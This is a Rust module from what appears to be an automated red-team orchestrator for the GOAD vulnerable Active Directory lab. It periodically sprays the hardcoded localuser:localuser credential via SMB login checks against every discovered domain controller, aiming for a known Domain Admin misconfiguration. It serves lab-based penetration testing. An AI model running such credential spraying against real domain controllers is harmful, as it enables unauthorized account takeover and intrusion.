//! auto_localuser_spray -- test localuser/localuser credentials across domains.
//!
//! GOAD configures a `localuser` account with username=password across all three
//! domains. In one domain this user has Domain Admin privileges. This module
//! specifically tests the localuser:localuser credential combo against each
//! discovered DC, which standard password spraying may miss if it doesn't
//! include "localuser" in its wordlist.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Tests localuser:localuser credentials against each domain.
/// Interval: 45s.
pub async fn auto_localuser_spray(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("localuser_spray") {
            continue;
        }

        let work: Vec<LocaluserWork> = {
            let state = dispatcher.state.read().await;

            let mut items = Vec::new();

            for (domain, dc_ip) in &state.domain_controllers {
                let dedup_key = format!("localuser:{}", domain.to_lowercase());
                if state.is_processed(DEDUP_LOCALUSER_SPRAY, &dedup_key) {
                    continue;
                }

                items.push(LocaluserWork {
                    dedup_key,
                    domain: domain.clone(),
                    dc_ip: dc_ip.clone(),
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "smb_login_check",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "credential": {
                    "username": "localuser",
                    "password": "localuser",
                    "domain": item.domain,
                },
            });

            let priority = dispatcher.effective_priority("localuser_spray");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        dc = %item.dc_ip,
                        "localuser credential spray dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LOCALUSER_SPRAY, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LOCALUSER_SPRAY, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(domain = %item.domain, "localuser spray deferred");
                }
                Err(e) => {
                    warn!(err = %e, domain = %item.domain, "Failed to dispatch localuser spray");
                }
            }
        }
    }
}

struct LocaluserWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("localuser:{}", "contoso.local");
        assert_eq!(key, "localuser:contoso.local");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_LOCALUSER_SPRAY, "localuser_spray");
    }
}
